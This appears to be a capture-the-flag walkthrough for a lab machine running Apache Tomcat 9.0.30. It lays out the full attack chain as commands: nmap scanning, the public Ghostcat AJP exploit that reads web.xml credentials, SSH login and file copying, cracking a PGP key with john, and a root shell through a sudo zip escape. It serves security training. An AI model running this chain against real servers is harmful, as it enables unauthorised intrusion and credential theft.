First of all take the IP MACHINE and apply this command

```

export IP=10.10.98.37

```

that's would save the IP in variable  if u want to call it just type $IP for example

```

ping $IP

```

Now let's start 



--------------

# Nmap scanning phase

I have use this command

```

nmap -sC -sV -T4 $IP 

```

## The Result

```

Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 03:04 EDT

Nmap scan report for 10.10.98.37

Host is up (0.14s latency).

Not shown: 996 closed tcp ports (reset)

PORT     STATE SERVICE    VERSION

22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 

|   2048 f3c89f0b6ac5fe95540be9e3ba93db7c (RSA)

|   256 dd1a09f59963a3430d2d90d8e3e11fb9 (ECDSA)

|_  256 48d1301b386cc653ea3081805d0cf105 (ED25519)

53/tcp   open  tcpwrapped

8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)

| ajp-methods: 

|_  Supported methods: GET HEAD POST OPTIONS

8080/tcp open  http       Apache Tomcat 9.0.30

|_http-favicon: Apache Tomcat

|_http-open-proxy: Proxy might be redirecting requests

|_http-title: Apache Tomcat/9.0.30

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 17.09 seconds

```

as we can see there is 4 ports open

- 22 SSH

- 53 tcpwrapped

- 8009 ajp13

- 8080 Apache tomcat 9.0.30

We are interested at 8080 port. because that's what CTF about

# Checking

Check what is contain

![](https://i.imgur.com/uyEkJTK.png)



Search for exploit for Tomcat/9.0.30

![](https://i.imgur.com/SGsauLh.png)

u can use any exploit u want but I will use this one.

download it using 

```

git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487.git

```

then 

```

 cd Ghostcat-CNVD-2020-10487/

```

![](https://i.imgur.com/3WjFN1R.png)

this exploit we can do three things Read,execute,save. u can check the github for further examples

![](https://i.imgur.com/FQfHzu1.png)

this is from Github we will use it as a reference. 

so it's ask for url + ajp port ==which we found in nmap phase== + directory that we want to read or execute + action



let's try that

```

python3 ajpShooter.py http://10.10.98.37:8080/ 8009 /WEB-INF/web.xml read

```

![](https://i.imgur.com/tyt7SO1.png)



seems that we got credentials 

skyfuck:8730281lkjlkjdqlksalks

try join SSH using these credentials

```

ssh skyfuck@$IP    

```

and the password is 8730281lkjlkjdqlksalks

![](https://i.imgur.com/Fd86lmw.png)

and we are in 

![](https://i.imgur.com/KpT98eH.png)

so we have two files. download it.

go to your local machine and type this to #Download 

```

scp skyfuck@$IP:/home/skyfuck/* .

```

![](https://i.imgur.com/DPfmndF.png)

successfully downloaded. 

![](https://i.imgur.com/f2WiVWt.png)

private key and pgp we can use #john_the_ripper to crack this

using this command #gpg2john #Public_key

```

gpg2john tryhackme.asc > cred.txt 

```

and we have new file named cred.txt

now use john to crack this 

```

john cred.txt --wordlist=/usr/share/wordlists/rockyou.txt

```

![](https://i.imgur.com/M7eJMx9.png)



now we want to decrypt credential.pgp but we can't do that because we didn't import tryhackme.asc to #gpg. type this command

```

gpg --import tryhackme.asc

```

it  would ask u for a password. it would be the one we got 

==alexandru==

![](https://i.imgur.com/XhnYlvM.png)

now we can decrypt credential.pgp

```

gpg --decrypt credential.pgp

```

![](https://i.imgur.com/hb7bxOy.png)



==merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j==



join the SSH using these creds we found

![](https://i.imgur.com/fDQY7CX.png)

```

ls

cat user.txt

```

and retrieve your flag.



# Privilege Escalation



we want to check what commands we can run without password

```

sudo -l

```

![](https://i.imgur.com/bRc8aWH.png)



using our friend GTFObins website

![](https://i.imgur.com/v64ZKmr.png)



![](https://i.imgur.com/LirxpwK.png)



so we want to type 

```

TF=$(mktemp -u)

sudo zip $TF /etc/hosts -T -TT 'sh #'

sudo rm $TF

```

to get our root shell

![](https://i.imgur.com/p6UEw0Q.png)

type 

```

cd /root

cat root.txt

```

to retrieve your root flag

